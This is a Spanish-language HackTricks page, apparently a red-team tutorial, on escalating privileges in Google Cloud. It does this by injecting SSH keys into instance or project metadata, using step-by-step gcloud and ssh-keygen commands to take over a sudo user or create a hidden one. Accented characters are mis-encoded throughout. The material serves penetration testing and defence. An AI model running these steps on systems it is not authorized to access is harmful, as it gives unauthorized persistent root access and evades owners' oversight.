# GCP - Agregar Metadatos SSH Personalizados

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n [**art√≠culos oficiales de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Modificando los metadatos <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

La modificaci√≥n de metadatos en una instancia podr√≠a llevar a **riesgos significativos de seguridad si un atacante obtiene los permisos necesarios**.

### **Incorporaci√≥n de Claves SSH en Metadatos Personalizados**

En GCP, los **sistemas Linux** a menudo ejecutan scripts desde el [Entorno de Invitado de Linux de Python para Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts). Un componente cr√≠tico de esto es el [daemon de cuentas](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts), que est√° dise√±ado para **verificar regularmente** el punto final de metadatos de la instancia en busca de **actualizaciones de las claves p√∫blicas SSH autorizadas**.

Por lo tanto, si un atacante puede modificar metadatos personalizados, podr√≠a hacer que el daemon encuentre una nueva clave p√∫blica, que ser√° procesada e **integrada en el sistema local**. La clave se agregar√° al archivo `~/.ssh/authorized_keys` de un **usuario existente o potencialmente creando un nuevo usuario con privilegios `sudo`**, dependiendo del formato de la clave. Y el atacante podr√° comprometer el host.

### **Agregar clave SSH a un usuario privilegiado existente**

1. **Examinar las Claves SSH Existentes en la Instancia:**
- Ejecuta el comando para describir la instancia y sus metadatos para localizar las claves SSH existentes. La secci√≥n relevante en la salida estar√° bajo `metadata`, espec√≠ficamente la clave `ssh-keys`.
```bash
gcloud compute instances describe [INSTANCIA] --zone [ZONA]
```
- Presta atenci√≥n al formato de las claves SSH: el nombre de usuario precede a la clave, separados por dos puntos.

2. **Preparar un Archivo de Texto para los Metadatos de la Clave SSH:**
- Guarda los detalles de los nombres de usuario y sus claves SSH correspondientes en un archivo de texto llamado `meta.txt`. Esto es esencial para preservar las claves existentes mientras se agregan nuevas.

3. **Generar una Nueva Clave SSH para el Usuario Objetivo (`alice` en este ejemplo):**
- Utiliza el comando `ssh-keygen` para generar una nueva clave SSH, asegur√°ndote de que el campo de comentario (`-C`) coincida con el nombre de usuario objetivo.
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
- Agrega la nueva clave p√∫blica a `meta.txt`, imitando el formato encontrado en los metadatos de la instancia.

4. **Actualizar los Metadatos de la Clave SSH de la Instancia:**
- Aplica los metadatos de la clave SSH actualizados a la instancia utilizando el comando `gcloud compute instances add-metadata`.
```bash
gcloud compute instances add-metadata [INSTANCIA] --metadata-from-file ssh-keys=meta.txt
```

5. **Acceder a la Instancia Usando la Nueva Clave SSH:**
- Con√©ctate a la instancia con SSH utilizando la nueva clave, accediendo al shell en el contexto del usuario objetivo (`alice` en este ejemplo).
```bash
ssh -i ./key alice@localhost
sudo id
```

### **Crear un nuevo usuario privilegiado y agregar una clave SSH**

Si no se encuentra ning√∫n usuario interesante, es posible crear uno nuevo al que se le otorgar√°n privilegios `sudo`:
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### Claves SSH a nivel de proyecto <a href="#sshing-around" id="sshing-around"></a>

Es posible ampliar el alcance del acceso SSH a m√∫ltiples M√°quinas Virtuales (VMs) en un entorno de nube mediante la **aplicaci√≥n de claves SSH a nivel de proyecto**. Este enfoque permite el acceso SSH a cualquier instancia dentro del proyecto que no haya bloqueado expl√≠citamente las claves SSH a nivel de proyecto. Aqu√≠ tienes una gu√≠a resumida:

1. **Aplicar Claves SSH a Nivel de Proyecto:**
- Utiliza el comando `gcloud compute project-info add-metadata` para agregar claves SSH desde `meta.txt` a los metadatos del proyecto. Esta acci√≥n asegura que las claves SSH sean reconocidas en todas las VMs del proyecto, a menos que una VM tenga habilitada la opci√≥n "Bloquear claves SSH a nivel de proyecto".
```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```

2. **Acceder a las Instancias Utilizando Claves a Nivel de Proyecto:**
- Con las claves SSH a nivel de proyecto en su lugar, puedes acceder por SSH a cualquier instancia dentro del proyecto. Las instancias que no bloquean las claves a nivel de proyecto aceptar√°n la clave SSH, otorgando acceso.
- Un m√©todo directo para acceder por SSH a una instancia es utilizando el comando `gcloud compute ssh [INSTANCIA]`. Este comando utiliza tu nombre de usuario actual y las claves SSH establecidas a nivel de proyecto para intentar el acceso.


# Referencias
* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
